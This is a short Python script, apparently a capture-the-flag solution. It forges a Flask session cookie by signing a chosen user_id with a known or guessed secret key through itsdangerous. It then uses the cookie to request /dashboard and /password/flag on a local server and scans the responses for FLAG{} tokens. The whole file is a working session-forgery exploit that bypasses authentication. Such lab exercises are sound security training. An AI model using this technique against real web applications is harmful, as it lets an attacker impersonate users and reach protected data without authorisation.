import hashlib
from itsdangerous import TimestampSigner, URLSafeTimedSerializer
import requests

# Configuration
secret_key = 'your_secret_key'
user_id = "10001"
base_url = "http://127.0.0.1:32948"

# Create the session payload - Flask session format
session_payload = {"user_id": user_id}

# Flask uses itsdangerous URLSafeTimedSerializer for session cookies
# The serializer uses TimestampSigner internally with salt='cookie-session'
serializer = URLSafeTimedSerializer(
    secret_key=secret_key,
    salt='cookie-session',
    serializer=None,
    signer=TimestampSigner,
    signer_kwargs={
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
)

# Serialize the payload to create the forged cookie
forged_cookie = serializer.dumps(session_payload)
print(f"[+] Forged session cookie for user_id={user_id}:")
print(f"    {forged_cookie}")

# Make request to /dashboard with forged cookie
print(f"\n[+] Requesting {base_url}/dashboard with forged cookie...")
resp_dashboard = requests.get(
    f"{base_url}/dashboard",
    cookies={'session': forged_cookie}
)
print(f"    Status: {resp_dashboard.status_code}")
print(f"    Length: {len(resp_dashboard.text)} characters")
print(f"\n[+] Response content:\n{resp_dashboard.text}")

# Check for FLAG{} tokens
import re
flags_dashboard = re.findall(r'FLAG\{[^}]+\}', resp_dashboard.text)
if flags_dashboard:
    print(f"\n[!] FLAG(S) FOUND in /dashboard: {flags_dashboard}")
else:
    print(f"\n[-] No FLAG{{}} tokens found in /dashboard")

# Make request to /password/flag with forged cookie
print(f"\n[+] Requesting {base_url}/password/flag with forged cookie...")
resp_flag = requests.get(
    f"{base_url}/password/flag",
    cookies={'session': forged_cookie}
)
print(f"    Status: {resp_flag.status_code}")
print(f"    Length: {len(resp_flag.text)} characters")
print(f"\n[+] Response content:\n{resp_flag.text}")

# Check for FLAG{} tokens
flags_password = re.findall(r'FLAG\{[^}]+\}', resp_flag.text)
if flags_password:
    print(f"\n[!] FLAG(S) FOUND in /password/flag: {flags_password}")
else:
    print(f"\n[-] No FLAG{{}} tokens found in /password/flag")

# Summary
print(f"\n" + "="*60)
